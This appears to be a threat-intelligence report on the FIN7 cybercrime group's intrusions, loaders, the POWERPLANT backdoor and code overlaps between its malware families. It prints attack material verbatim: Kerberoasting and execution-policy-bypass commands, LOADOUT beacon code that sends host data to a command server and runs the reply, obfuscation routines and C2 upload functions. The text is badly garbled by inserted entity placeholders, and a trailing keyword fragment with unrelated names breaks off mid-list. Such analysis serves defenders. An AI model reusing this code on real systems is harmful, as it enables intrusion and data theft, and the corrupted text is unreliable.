[ORG] Utilities . We identified [CARDINAL] over [CARDINAL] a [CARDINAL] dozen intrusions attributed to FIN7 since [DATE] 2020 across our client base . The following use case profiles recent FIN7 tradecraft during a Mandiant Managed Defense engagement in [CARDINAL] 2021.FIN7 From the [GPE] TrenchesTo obtain initial access during this intrusion , FIN7 used compromised Remote Desktop Protocol ( RDP ) credentials to login to a target server across [DATE] two [DATE] separate [DATE] days , and initiated [CARDINAL] two similar Windows process chains ( [ORG] Figure 7).Figure [CARDINAL] 7 : [CARDINAL] Two FIN7 process event chainsrdpinit.exe \u21b3 cmd.exe4/23 \u21b3 rundll32.exeFIN7 used established RDP access to eventually install other modes of host control , [ORDINAL] first by executing [ORG] PowerShell reconnaissance scripts , then by executing a TERMITE loader ( Figure [CARDINAL] 8).Figure [CARDINAL] 8 : Command line used to load FIN7 TERMITERunDll32 TstDll.dll , [ORG] TstSec 11985756TERMITE is a password - protected shellcode loader which we have observed [CARDINAL] at [CARDINAL] least [CARDINAL] seven distinct threat groups use to load [PERSON] BEACON , [ORG] METASPLOIT , and [PERSON] BUGHATCH shellcodes . FIN7 used TERMITE to load and execute a shellcode stager for Cobalt Strike BEACON in this case . Following secondary access of [PERSON] BEACON , FIN7 began further enumeration using built - in Windows commands as well as [ORG] POWERSPLOIT and Kerberoasting PowerShell modules.cmd.exe /C net group \" [WORK_OF_ART] Domain [WORK_OF_ART] Admins \" /domain cmd.exe /C quser powershell.exe -c import - module [PRODUCT] C:\\Users\\Public\\kerberoast_hex.ps1 ; Invoke [ORG] - Kerberoast [ORG] - [ORG] OutputFormat [ORG] HashCat [ORG] > [ORG] hash.txt powershell.exe -ex bypass -c import - module [PRODUCT] C:\\Users\\Public\\kerberoast_hex.ps1 ; Invoke- Kerberoast -OutputFormat HashCat powershell.exe -ex bypass -f pkit.ps1After the initial reconnaissance using RDP and [ORG] BEACON , FIN7 executed an obfuscated loader for a victim - customized variant of the [ORG] PowerShell - based backdoor [NORP] POWERPLANT , providing tertiary access : powershell.exe -ex bypass -f cube.ps1FIN7 then attempted to steal credentials and further compromise the victims \u2019 environment with limited success , as the client was able to respond and quickly remediate with the advantage of [ORG] Managed [ORG] Defense responders . A unique aspect of this specific intrusion perfectly highlighted the challenges of technical attribution for cybercriminal threats : [DATE] Between [DATE] the [DATE] two [DATE] days of FIN7 operations on the victim system , FIN12 was also active on the same victim for [TIME] multiple [TIME] hours using the same RDP account , but much different infrastructure and tradecraft , attempting to install BEACON using the [ORG] WEIRDLOOP in - memory dropper before the intrusion was remediated . FIN7 \u2019s [ORG] EvasionAmong [ORG] FIN7 \u2019s historical trademarks were their creative obfuscation and fast development of evasive techniques . This is still the case , with FIN7 [ORDINAL] first stage droppers and downloaders being heavily obfuscated . LOADOUT in particular , due to its wide distribution in opportunistic campaigns , has been through several iterations meant to improve evasion . The initial obfuscation mechanism was basic but effective at evading static detections : the malicious code was interspersed with random junk code ( Figure [CARDINAL] 9 ) . After [DATE] a [DATE] few [DATE] months of successful campaigning , AV detection engines improved coverage of the downloader . To get around this , and to send a [NORP] message,5/23LOADOUT developer(s ) broke up the beacon suspected to be used in detection signatures by simply inserting \u201c FUCKAV \u201d into the strings ( Figure [CARDINAL] 8).Figure [CARDINAL] 8 : System survey information sent as beacon by [ORG] LOADOUTdata = \" id= \" & get_id ( ) [ORG] & \" [ORG] & FUCKAVtype = put \" & get_computer_info ( \" \" ) & \" & DomainHosts= \" & count_domain_hosts ( ) & \" & UserName= \" & usFUCKAVername & \" & LogicalDrives= \" & get_grivers ( ) & \" & SystemInfo = nothing&SoftwareInfo = nothing&NetworkInfo = nothingFUCKAV&ProcessList= \" & get_processlist ( ) & \" & DesktopFileList= \" & get_desktopfiles ( ) & \" & DesktopScreenshFUCKAVot = nothing&WebHistory = [ORG] nothing&stype = vbs \" response = send(panel_url , data ) if response = \" okFUCKAV \" then js = send(panel_url , \" \" ) run_js(js ) end ifFUCKAVFigure [CARDINAL] 9 : LOADOUT obfuscationkiki = ado . [ORG] ReadText [ORG] WScript . [PERSON] Echo ( \" error \" ) kok = replace(kiki , \" FUCKAV \" , \" \" ) ulpo = \" [CARDINAL] 12 \" aoso = [PRODUCT] year(\"01/07/12 \" ) if right(aoso , [CARDINAL] 2 ) = ulpo then execute(\"WScript . [PERSON] Echo ( \" \" file is corrupted \" \" ): \" & kok ) end if ' hello bitchwIndeed , the developer(s ) was correct to be suspicious that these strings were being used for detection . By pivoting on the beacon , we discovered a new , work - in - progress variant of [ORG] LOADOUT submitted to the offending [ORG] PowerShell command obscured through their custom obfuscation mechanism ( Figure [CARDINAL] 11).Figure [CARDINAL] 10 : [ORG] PowerShell command before obfuscationobjTS.WriteLine(TextCrypt ) objTS.Close pwsh_command = \" powershell.exe -executionpolicy bypass -file \" & FileName & \" .ps1 \" objWSH.Run pwsh_command , 0 , True FSO.DeleteFile FileName & \" .ps1\"6/23Figure [CARDINAL] 11 : [ORG] PowerShell command obfuscationText1 = \" /3/3.1/2.1,7/2/2.0/3 + 4 + 5/4/2 * [CARDINAL] 3,7.0,7/2/2.1/4.0,6/3/3.0/3.0 + 5/4 + 5- 261416272214202710112212232310 \" TextCrypt = Encryption(MakeCryptoText(TextUnShifter(Text1 ) ) , False ) pwsh_command = [ORG] TextCrypt [ORG] & [ORG] FileName [ORG] & \" .ps1 \" objWSH.Run pwsh_command , 0 , True FSO.DeleteFile FileName & \" .ps1\"FIN7 actors have historically tested their tools against public repositories to check static detection engine coverage . It is likely that in this case , they were testing the strength of their custom obfuscation . This new and improved version of [ORG] LOADOUT emerged [DATE] five [DATE] months [DATE] later . It was refactored to add multiple layers of obfuscation , including interspersed [WORK_OF_ART] Bible verses as filler text , and string obfuscation through a custom mechanism ( Figure [CARDINAL] 12).Figure [CARDINAL] 12 : LOADOUT custom string obfuscationPrivate Function GetShiftKey ( ) On Error Resume Next Set Key = CreateObject(\"Scripting . Dictionary \" ) l = Len(CryptoKey ) For i = 1 To l s = Mid(CryptoKey , i , [CARDINAL] 1 ) n = ( [NORP] Asc(s ) Mod 8) + 1 If Not .Exists(n ) Then .Add n , n i1 = i1 + 1 End If If i1 = [CARDINAL] 9 Then Exit For Next If i > = l And i1 < 9 Then For i = [CARDINAL] 1 + 1 To 8 If Not .Exists(i ) Then .Add i , i End If7/23Next End If For i = [CARDINAL] 1 To [CARDINAL] 8 GetShiftKey = GetShiftKey + .Items()(i ) Private Function TextShifter(txt ) [PERSON] Dim [PERSON] nKeys ( ) , out ( ) Key = GetShiftKey n = Len(Key ) If n = 0 Then Exit Function l = [ORG] Len(txt ) m = -Int(-l / n ) [PERSON] ReDim [PERSON] nKeys(n ) For i = [CARDINAL] 1 To n s1 = [ORG] Mid(Key , i , [CARDINAL] 1 ) For j = [CARDINAL] 1 To n s2 = [ORG] Mid(Key , j , [CARDINAL] 1 ) If s1 > s2 Or ( s1 = s2 And j < = i ) Then nKeys(i ) = nKeys(i ) + 1 ReDim out(n * m ) For i = [CARDINAL] 1 To Len(txt ) out(nKeys((i - 1 ) Mod n + 1 ) * m + ( i - 1 ) \\ n - m + 1 ) = [NORP] Mid(txt , i , [CARDINAL] 1 ) Next TextShifter = Join(out , \" \" ) End Function POWERPLANT : FIN7 \u2019s PowerShell Workhorse8/23FIN7 has leveraged multiple methods of initial and secondary access into victim networks including phishing , compromising [ORDINAL] third - party systems , [PERSON] Atera agent installers , GoToAssist , and RDP . In a recent case , FIN7 actors compromised a website that sells digital products and modified multiple download links to point to an [ORG] Amazon [ORG] S3 bucket hosting trojanized versions , containing an [PERSON] Atera agent installer . This remote management tool was later used to deploy POWERPLANT to the victim system . This was the [ORDINAL] first time [ORG] Mandiant observed FIN7 leverage supply chain compromise . FIN7 \u2019s time - tested [ORG] CARBANAK and [ORG] DICELOADER ( also known as Lizar ) malware continue to be in use ; however , we have noticed FIN7 depend more on the [NORP] POWERPLANT backdoor during recent intrusions . Our research into POWERPLANT has revealed that it is a vast backdoor framework with a breadth of capabilities , depending on which modules are delivered from the C2 server . POWERPLANT backdoors contain internal version identifiers within the code . We have identified samples ranging from version \u201c 0.012 \u201d through \u201c [CARDINAL] 0.028 \u201d , with examples shown in Table 1.Table [CARDINAL] 1 : POWERPLANT samplesVersionPOWERPLANT Sample MD5 developing [NORP] POWERPLANT ( Figure [CARDINAL] 13 ) . In [CARDINAL] one engagement , we observed FIN7 deploy incremented versions of POWERPLANT with tweaked functionality to targets in the middle of intrusion operations . During that engagement , versions \u201c [CARDINAL] 0.023 \u201d and \u201c [CARDINAL] 0.025 \u201d were both used within a [TIME] 10 [TIME] - minute timeframe . Each version we have identified implements overall similar functionality with some programmatic improvements and features added over [DATE] time.9/23Figure [DATE] 13 : POWERPLANT version numbers10/23Mandiant also recovered portions of server - side code components from [NORP] POWERPLANT controllers . Some of these components contain clues that hint at the operational security mindfulness of the malware \u2019s developers . [CARDINAL] Two such examples are FIN7 being aware of researchers investigating their infrastructure , and employing capabilities to ban target host aspects such as usernames from the panel . Figure [CARDINAL] 14 : Snippet of functions from [ORG] POWERPLANT [ORG] Server Settingscheck_username check_desktopFigure [CARDINAL] 15 : Snippet of functions from POWERPLANT [PERSON] Server [PERSON] Settingsif ( res ) { localStorage.setItem('success - add - username ' , ' success - add - username- Figure [CARDINAL] 16 : Snippet of functions from POWERPLANT Server Configuration isPage : true,11/23isModal : false , } During active [CARDINAL] C2 sessions , POWERPLANT servers will send multiple additional module types as \u201c tasks \u201d for target systems to execute . [CARDINAL] Two of these modules are EASYLOOK and [ORG] BOATLAUNCH.EASYLOOK [ORG] ModuleEASYLOOK is a reconnaissance utility that FIN7 has used since [DATE] at [DATE] least [DATE] 2019 . EASYLOOK captures a wide range of data from infected systems , including operating system version , registration key , system name , username , domain information , and hardware specifications . The initial version of EASYLOOK was delivered by a GRIFFON C2 server and written in JScript ( Figure [CARDINAL] 18 ) . FIN7 \u2019s updated variation of EASYLOOK was delivered by a POWERPLANT variant C2 server and written in [ORG] PowerShell ( Figure [CARDINAL] 17 ) . Both versions implemented the exact same functionality across [CARDINAL] two code languages , including the typo \u201c bios_versoin\u201d . Figure [CARDINAL] 17 : VM check from new variant of FIN7 EASYLOOK coded in [LOC] PowerShellfunction [LOC] is_wm { $ bios = Get [ORG] - WMIObject [ORG] Win32_Bios $ [ORG] SerialNumber = $ bios . [ORG] SerialNumber $ bios_versoin = $ bios . SMBIOSBIOSVersion If ( $ [MONEY] SerialNumber . Contains(\"parallels \" ) -or $ [MONEY] SerialNumber . Contains(\"vmware \" ) ) { If ( $ bios_versoin . Contains(\"vmware \" ) -or $ bios_versoin . Contains(\"virtualbox \" ) ) { } Figure [CARDINAL] 18 : VM check from [ORDINAL] first variant of FIN7 EASYLOOK coded in [FAC] JavaScriptfunction [FAC] is_vm ( ) { var biosRequest = wmi . ExecQuery('SELECT * FROM Win32_BIOS ' ) ; var biosItems = new Enumerator(biosRequest ) ; for (; ! biosItems.atEnd ( ) ; biosItems.moveNext ( ) ) { [CARDINAL] 12/23var bios_versoin = biosItems.item().SMBIOSBIOSVersion.toLowerCase ( ) ; var serial_number = biosItems.item().SerialNumber.toLowerCase ( ) ; if(serial_number.indexOf('parallels ' ) > = 0 || serial_number.indexOf('vmware ' ) > = if(bios_versoin.indexOf('vmware ' ) > = 0 || bios_versoin.indexOf('virtualbox ' ) > = } BOATLAUNCH ModuleBOATLAUNCH is a utility sent from FIN7 POWERPLANT controllers that is used as a helper module during intrusion operations . BOATLAUNCH is used to patch [ORG] PowerShell processes on infected systems to bypass Windows AntiMalware Scan Interface ( AMSI ) . The malware loops , looking for unpatched [ORG] PowerShell processes , and for each unpatched process the malware locates and patches amsi.dll!AmsiScanBuffer with a [QUANTITY] 5 [QUANTITY] - byte instruction sequence to always return S_OK.The technique used to patch [ORG] AMSI is a variation of publicly described common AMSI bypass techniques . Both 32bit and 64bit variants of BOATLAUNCH have been observed using the following export directory [ORG] DLL names ( [ORG] Table [ORG] 2).Table [ORG] 2 : [ORG] BOATLAUNCH [ORG] PE [ORG] Export [ORG] Directory [ORG] NamesBOATLAUNCH [ORG] Bitness [ORG] Export [ORG] Directory [ORG] Name The Curious Cases of BIRDWATCHamsi32_kill.dll amsi64_kill.dllOur deep dive also revealed usage of [ORG] BIRDWATCH and its \u2019 similar variants used by FIN7 and suspected FIN7 groups such as [ORG] UNC3381 . BIRDWATCH is a .NET - based downloader which retrieves payloads over [ORG] HTTP , writing them to disk and then executing them . BIRDWATCH uploads reconnaissance information from targeted systems as well , which includes running processes , software installed , network configuration , web browser information and active directory data . [ORG] BIRDWATCH is often referred to collectively as \u201c JssLoader \u201d ; however , multiple variations of [ORG] BIRDWATCH exist which we track as separate code families . [CARDINAL] One variant of [ORG] BIRDWATCH is CROWVIEW , which is also .NET - based , but has enough code differences from prototypical BIRDWATCH that we cluster it separately . Unlike [PERSON] BIRDWATCH , CROWVIEW can house an embedded payload , can self - delete , supports additional arguments and stores a slightly different configuration.13/23FIN7 has implemented similar or exact functionality in different programming languages , observed in various code families several times over [DATE] the [DATE] past [DATE] few [DATE] years . Similar to EASYLOOK , which has both [PERSON] JScript and [ORG] PowerShell variants , [PERSON] BIRDWATCH and CROWVIEW have separate versions implemented in [LANGUAGE] C++ . This data point of code reuse and overlaps aided our technical attribution throughout multiple [ORG] UNC merges , when combined with additional infrastructure and tradecraft analysis . In this [ORDINAL] first example , programmatic collection of the [ORG] BIOS ( [ORG] Basic [ORG] Input [ORG] Output [ORG] System ) serial number is shown across [NORP] POWERPLANT and CROWVIEW code families . Figure [CARDINAL] 19 : C # Code Snippet from FIN7 - attributed CROWVIEW , a variant of BIRDWATCHprivate static string GetBiosSerial ( ) { string result = \" BIOS UNKNOWN \" ; new ManagementObjectSearcher(\"SELECT SerialNumber FROM Win32_BIOS \" ) ; ManagementObjectCollection managementObjectCollection = managementObjectSearcher . Get ( ) ; foreach ( ManagementBaseObject managementBaseObject ( string)managementObject[\"SerialNumber \" ] ; } Figure [CARDINAL] 20 : PowerShell Code Snippet from [ORG] FIN7 [ORG] - attributed POWERPLANTfunction Get - BiosSerial ( ) { $ sn = \" BIOS UNKNOWN \" $ [MONEY] mSearcher = Get [ORG] - WmiObject -Query \" SELECT SerialNumber FROM [DATE] Win32_BIOS\"14/23foreach ( $ o in $ [MONEY] mSearcher ) { if ( $ o. Properties . Name -eq \" SerialNumber \" ) { $ _ sn = $ o. Properties . Value if ( [ String]::IsNullOrEmpty($_sn ) -eq $ false ) { $ sn = $ _ sn } return \" $ sn \" ; } System enumeration data formatting overlaps also exist between [NORP] FOWLGAZE and EASYLOOK . Both code families implement near identical system surveys , with the shared usage of keys such as \u201c pc_domain \u201d , \u201c pc_dns_host_name \u201d , \u201c pc_model \u201d and \u201c no_ad\u201d . Figure [CARDINAL] 21 : Data Collection JSON Format Snippet of FOWLGAZE(\"JssLoader\"){\"host\":\"<HOSTNAME > \" , \" domain \" : \" < DOMAIN > \" , \" user\":\"<USERNAME > \" , \" processes \" : [ < PROCESS_LIST > ] , \" [WORK_OF_ART] desktop_file_list \" : [ < FILE_LIST > ] , \" adinfo \" : { \" adinformation\":\"no_ad \" , \" part_of_domain\":\"no \" , \" pc_domain \" : \" \" , \" pc_dns_host_name \" : \" \" , \" pc_model \" : \" \" } } Figure [CARDINAL] 22 : Data Collection Code Snippet of EASYLOOK ( [PERSON] Reconnaissance [PERSON] Module ) $ result + = ( ' username * * * ' + $ env : [GPE] USERNAME ) $ result + = ( ' hostname * * * ' + $ env : COMPUTERNAME ) $ elevated = $ ( whoami /groups).Contains(\"12288 \" ) $ result + = ' elevated * * * ' + ' no ' $ result + = ( ' adinformation * * * ' + $ ad ) } else { $ result + = ( ' adinformation***no_ad ' ) } $ [MONEY] csRequest = Get [ORG] - WmiObject Win32_ComputerSystem $ csRequest . PartOfDomain15/23If ( $ csRequest . PartOfDomain ) { $ result + = ( ' part_of_domain***yes ' ) $ result + = ( ' part_of_domain***no ' ) } $ result + = ' pc_domain * * * ' + $ csRequest . Domain $ result + = ' pc_dns_host_name * * * ' + $ [MONEY] csRequest . DNSHostName $ result + = ' pc_model * * * ' + $ csRequest . ModelA final code reuse example is usage of \" theAnswer \" , defined as variable within program functionality of [ORG] POST requests to [CARDINAL] C2 controllers for both CROWVIEW and [NORP] POWERPLANT , as shown in Figure [CARDINAL] 23 and Figure 24.Figure [CARDINAL] 23 : C # Code Snippet from FIN7 - attributed CROWVIEW and [ORG] BIRDWATCH ( [ORG] JssLoader)public void Put(string theAnswer ) { AppHttp.wCli . QueryString . Clear ( ) ; AppHttp.wCli . QueryString . [PERSON] Add(\"type \" , \" put \" ) ; string text = [ORG] Convert . ToBase64String(Encoding . ASCII.GetBytes(AppParams . ProgID)).Replace(\"+ \" , \" * * * \" ) ; string text2 = [ORG] Convert . ToBase64String(Encoding . [PERSON] ASCII.GetBytes(\"put\")).Replace(\"+ \" , \" * * * \" ) ; string body = string . Concat(new string [ ] string text3 = this . HttpUpload(AppParams . URL_PutAnswer , body ) ; } Figure [CARDINAL] 24 : PowerShell Code Snippet from FIN7 - attributed POWERPLANT Function Send - ToConsole([String ] $ theAnswer ) { if ( [ String]::IsNullOrEmpty($theAnswer ) ) { return } [CARDINAL] 16/23$_rc = \" \" try { $ _ wc = New - Object System . Net . WebClient $ _ wc . QueryString . Add(\"id \" , $ script : myID ) $ _ wc . Headers . Add(\"Content - type \" , \" text / html \" ) $ _ wc . Headers . Add(\"Accept \" , \" text / html \" ) $ _ rc = $ _ wc . UploadString($urlConsole , $ [MONEY] theAnswer)Malware code usage is sometimes considered a primary data point for some public threat attribution . Code overlaps by themselves , without sufficient additional data points such as intrusion data and infrastructure , are not strong enough for us to fully assess that an [ORG] UNC group should be merged . Throughout [DATE] 2021 and well into [DATE] 2022 , we have identified and will continue to track multiple newly suspected FIN7 UNCs and their activity moving forward . Additional Recent Activity from [GPE] Suspected FIN7 [GPE] UNCsIn [DATE] October [DATE] 2021 , [ORG] Mandiant observed a campaign where actors mailed victim organizations \u201c BadUSB \u201d malicious [ORG] USB devices , primarily targeting U.S.-based organizations . We attribute this campaign to [ORG] UNC3319 , a group which we suspect to be associated with FIN7 with low confidence . The [ORG] USB hardware was programmed to download STONEBOAT , which ultimately installed the [ORG] DICELOADER framework on the victim system . STONEBOAT is a previously unseen , .NET - based in- memory dropper which decrypts a shellcode payload embedded in it . The payload is then mapped into memory and executed . STONEBOAT was observed [ORDINAL] first loading an intermediary loader called [ORG] DAVESHELL , which then executed the final [ORG] DICELOADER payload . [ORG] DAVESHELL is publicly available , open - source code for a launcher of embedded payloads . [ORG] DAVESHELL is used by [CARDINAL] nearly [CARDINAL] 30 threat groups including FIN12 ; however , the implementation of DAVESHELL shellcode loading [PERSON] DICELOADER was unique to a small cluster of threat activity . Additionally , we \u2019ve identified multiple phishing campaigns distributing BIRDWATCH that have leveraged compromised accounts on various email delivery and marketing platforms , including [ORG] Maropost , [ORG] ActiveCampaign , and [ORG] Mailjet . We attribute this activity to [ORG] UNC3381 , which is suspected to be FIN7 with low confidence . UNC3381 was [ORDINAL] first observed in [DATE] September [DATE] 2021 , but we \u2019ve identified similar activity leveraging Mailjet dating back to late 2019 , suspected to be UNC3381 with high confidence . Throughout their campaigns , [ORG] UNC3381 has used nearly identical Quickbooks - themed invoice lures and leveraged the branding of the compromised account that they were sent from , providing additional legitimacy for their phishes . These emails contained a malicious link that goes through the analytics domain associated with the platform they were sent from , before redirecting to a page typically hosted on a compromised domain.17/23Figure [CARDINAL] 25 : UNC3381 Quickbooks - themed phishing emailUNC3381 has used multiple malware families in these campaigns , including [ORG] WINGNIGHT and [ORG] FLYHIGH , [CARDINAL] two different downloader families which we \u2019ve only observed being used by [ORG] UNC3381 . WINGNIGHT is a [ORG] WSF - based downloader that utilizes VBScript , and [ORG] FLYHIGH is a downloader written in C using [LAW] the [LAW] Excel [LAW] XLL [LAW] SDK , but masquerades as using the [PRODUCT] Excel - DNA framework . In these campaigns , we observed both WINGNIGHT and [ORG] FLYHIGH leading to [ORG] BIRDWATCH , often leveraging additional compromised domains for both the download server and the BIRDWATCH C2 controller . We \u2019ve observed limited overlaps between [ORG] UNC3381 and FIN7 infrastructure as well , including the use of the same [ORG] DNS provider and AS . FIN7 and [ORG] RansomwareMandiant published finished intelligence in [DATE] 2020 which outlined evidence of [ORG] FIN7 \u2019s possible shift in monetization of intrusions from payment card data to extortion operations . Although [ORG] FIN7 \u2019s operations have shifted substantially when compared to their older activity , as of publishing this report , [ORG] Mandiant has not attributed any direct deployment of ransomware to FIN7 . However , the possibility that FIN7 actors are engaging in ransomware operations is also substantiated by evidence outside of our intrusion data holdings and includes code usage , actor infrastructure , and trusted [ORDINAL] third party sources . In [CARDINAL] at [CARDINAL] least [CARDINAL] two incident response engagements in [DATE] 2020 , FIN7 intrusion operations were identified prior to ransomware encryption , including the use of [ORG] MAZE and [ORG] RYUK . Similarly in [DATE] 2021 , [ORG] Mandiant attributed active FIN7 intrusion activity during an incident response engagement involving [ORG] ALPHV ransomware . In all these cases , the ransomware deployment is currently attributed to separately tracked threat groups due to factors of the investigation and our visibility . In addition to evidence produced from intrusion data , secondary artifacts suggest FIN7 played a role in at least some DARKSIDE operations . A low global prevalence code signing certificate used by FIN7 in 202118/23to sign BEACON and [PERSON] BEAKDROP samples was also used to sign multiple unattributed DARKSIDE samples recovered in the wild ( Table 3 ) . The specific mentioned code signing certificate used by FIN7 contained the [ORG] SSL subject common name of \u201c [WORK_OF_ART] OASIS [WORK_OF_ART] COURT [WORK_OF_ART] LIMITED \u201d ( Figure [CARDINAL] 26).Figure [CARDINAL] 26 : Code signing certificate used by FIN7 , also used to sign multiple DARKSIDEransomware samplesSerial Number : e4 : e7:95 : [CARDINAL] fd:1f : d2:55:95 : b8:69 : ce:22 : aa:7d : c4:9fSignature Algorithm : sha256WithRSAEncryptionIssuer : C = [GPE] GB , [GPE] ST = [GPE] Greater [GPE] Manchester , L = [NORP] Salford , O = [PERSON] Sectigo [PERSON] Limited , CN = Sectigo RSA Code Signing CAValidityNot Before : Dec [CARDINAL] 21 00:00:00 [DATE] 2020 GMTNot After : [DATE] Dec [DATE] 21 [TIME] 23:59:59 [DATE] 2021 GMTSubject : C = GB , postalCode = CO3 [CARDINAL] 9FA , [GPE] ST = Essex , L = Colchester , street = [CARDINAL] 10 [GPE] Stoneleigh [GPE] Park , O = OASIS COURT LIMITED , CN = [ORG] OASIS [ORG] COURT LIMITEDTable 3 : [PERSON] Files signed with code certificateNoteFile MD5 [ORG] ConclusionDespite indictments of members of FIN7 in [DATE] 2018 and a related sentencing in [DATE] 2021 announced by [ORG] the [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice , at least some members of FIN7 have remained active and continue to evolve their criminal operations over time . Throughout their evolution , FIN7 has increased the speed of their operational tempo , the scope of their targeting , and even possibly their relationships with other ransomware operations in the cybercriminal underground . AcknowledgementsThank you to [PERSON] Van [PERSON] Ta , [PERSON] Rufus [PERSON] Brown , [PERSON] Dan [PERSON] Perez , [PERSON] Barry [PERSON] Vengerik , [PERSON] Kimberly [PERSON] Goody and [PERSON] Andrew [PERSON] Thompson for a technical review of this content and FIN7 research involved behind - the - scenes . In addition , thank you to all Mandiant Incident Response and Managed Defense responders for harvesting the valuable intrusion data that enables our research . Indicators of Compromise ( IOCs)19/23NotesLOADOUT C2 LOADOUT C2BEACON C2 BEACON C2POWERPLANT C2 Mandiant Security Validation ActionsCROWVIEW / LOADOUT C220/23Organizations can validate their security controls against [CARDINAL] more [CARDINAL] than [CARDINAL] 25 actions with [ORG] Mandiant [ORG] Security [ORG] Validation . NameVID A150 - 527 [ORG] Command and [ORG] Control [ORG] - [ORG] FIN7 , BATELEUR , Check - in A150 - 528 Command and [ORG] Control [ORG] - [ORG] FIN7 , [ORG] GRIFFON , Check - in A151 - 165 [ORG] Command and [ORG] Control [ORG] - [ORG] FIN7 , [ORG] GRIFFON , [ORG] DNS Query # [MONEY] 1 A151 - 166 [ORG] Command and [ORG] Control [ORG] - [ORG] FIN7 , [ORG] GRIFFON , [ORG] DNS Query # 2 A104 [ORG] - 585 Host CLI - FIN7 , Local Javascript Execution via [ORG] WMI and [ORG] Mshta A150 [ORG] - 546 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] CARBANAK , [PERSON] Download , Variant # 1 A150 - 548 Malicious File Transfer - FIN7 , [ORG] CARBANAK , [PERSON] Download , Variant # 3 A150 - 710 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] DICELOADER , [PERSON] Download , Variant # 1 A150 - 549 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] DRIFTPIN , [PERSON] Download , Variant # 1 A150 - 550 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] DRIFTPIN , [PERSON] Download , Variant # 2 A151 - 168 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] GRIFFON , [PERSON] Download , JavaScript Variant A150 - 553 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] GRIFFON , [PERSON] Download , Variant # 1 A150 - 554 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] GRIFFON , [PERSON] Download , Variant # 2 A150 - 555 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] GRIFFON , [PERSON] Download , Variant # 3 A150 - 572 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] SUPERSOFT , [PERSON] Download , Variant # 1 A150 - 729 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] TAKEOUT , [PERSON] Download , Variant # 1 A150 - 730 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] TAKEOUT , [PERSON] Download , Variant # 2 A150 - 731 Malicious [PERSON] File [PERSON] Transfer [PERSON] - [PERSON] FIN7 , [ORG] TAKEOUT , [PERSON] Download , Variant # 3 A150 - 585 Phishing Email - Malicious Attachment , FIN7 , BATELEUR DOC Lure A150 - 586 Phishing Email - Malicious Attachment , FIN7 , GRIFFON DOCM Lure A151 - 167 Phishing Email - Malicious Attachment , FIN7 , [ORG] GRIFFON , Windows [CARDINAL] 11 Themed Lure A150 - 587 Phishing Email - Malicious Attachment , FIN7 , [PERSON] Tracking [PERSON] Pixel A150 [PERSON] - 590 Protected Theater - FIN7 , [ORG] BATELEUR , Execution [CARDINAL] A151 - 044 Protected Theater - FIN7 , [ORG] CARBANAK , Execution A150 - 366 Protected Theater - FIN7 , [ORG] CULTSWAP , Execution A150 - 591 Protected Theater - FIN7 , [ORG] GRIFFON , Execution [PRODUCT] A151 [PRODUCT] - 170 [PRODUCT] Protected [PRODUCT] Theater [PRODUCT] - [PRODUCT] FIN7 , [ORG] GRIFFON , Execution , JavaScript Variant A151 - 169 [ORG] Protected [ORG] Theater [ORG] - [ORG] FIN7 , [ORG] GRIFFON , Execution , Word Document Variant MITRE ATT&CK MappingThroughout 2020 and [DATE] 2021 , [ORG] Mandiant has observed FIN7 use the following techniques : ExecutionT1059 : Command and Scripting Interpreter T1059.001 : [ORG] PowerShell T1059.003 : [ORG] Windows [ORG] Command [ORG] Shell T1059.005 : Visual Basic T1059.007 : JavaScript T1204.001 : Malicious Link T1204.002 : Malicious File21/23T1569.002 : Service ExecutionInitial AccessT1195.002 : [ORG] Compromise [ORG] Software [ORG] Supply [ORG] Chain T1199 : [ORG] Trusted [ORG] Relationship T1566.001 : Spearphishing Attachment T1566.002 : Spearphishing LinkImpactT1491.002 : External DefacementResource DevelopmentT1583.003 : Virtual Private Server T1588.003 : Code Signing Certificates T1588.004 : [ORG] Digital [ORG] Certificates [ORG] T1608.003 : Install Digital Certificate T1608.005 : Link TargetDefense EvasionT1027 : Obfuscated Files or Information T1027.005 : Indicator Removal from [ORG] Tools T1036 : Masquerading T1036.003 : Rename System Utilities T1055 : Process Injection T1070.004 : File Deletion T1140 : Deobfuscate / Decode [ORG] Files [ORG] or Information T1218.010 : [ORG] Regsvr32 [ORG] T1218.011 : [ORG] Rundll32 T1497.001 : [ORG] System [ORG] Checks T1553.002 : Code Signing T1564.003 : [PERSON] Hidden [PERSON] Window T1620 : Reflective Code LoadingCollectionT1113 : Screen Capture T1213 : Data from [ORG] Information [ORG] Repositories T1560 : [ORG] Archive [ORG] Collected [ORG] DataLateral MovementT1021.001 : Remote Desktop Protocol T1021.004 : SSH22/23Command and ControlT1071.001 : Web Protocols T1090 : [PERSON] Proxy T1095 : Non [ORG] - Application [ORG] Layer [ORG] Protocol T1105 : Ingress Tool Transfer T1132.001 : Standard Encoding T1573.002 : [ORG] Asymmetric [ORG] CryptographyDiscoveryT1012 : [ORG] Query [ORG] Registry T1033 : System Owner / User [PRODUCT] Discovery T1057 : [PRODUCT] Process [PRODUCT] Discovery T1069 : [PRODUCT] Permission [PRODUCT] Groups [PRODUCT] Discovery T1069.002 : Domain Groups T1082 : System Information [PRODUCT] Discovery T1083 : [ORG] File [ORG] and [ORG] Directory [ORG] Discovery T1087 : Account Discovery T1087.002 : Domain Account T1482 : Domain Trust Discovery T1518 : Software DiscoveryCredential AccessT1110.002 : [PERSON] Password [PERSON] Cracking T1555.003 : Credentials from Web Browsers T1558.003 : [PERSON] Kerberoasting23/23", "generated_text": "the evolution; the evolution; FIN7; Power Hour; overlaps; FIN7 activity; January 2022; PowerShell; PowerPlank; use; stolen credentials; Lazarus; POWERPLANT; newer intrusions; monetization strategies; data theft; non-binding; attribution; overlaps; information; the group; the same access method; hours; minutes; the same group; the attribution; Cobalt Strike; an 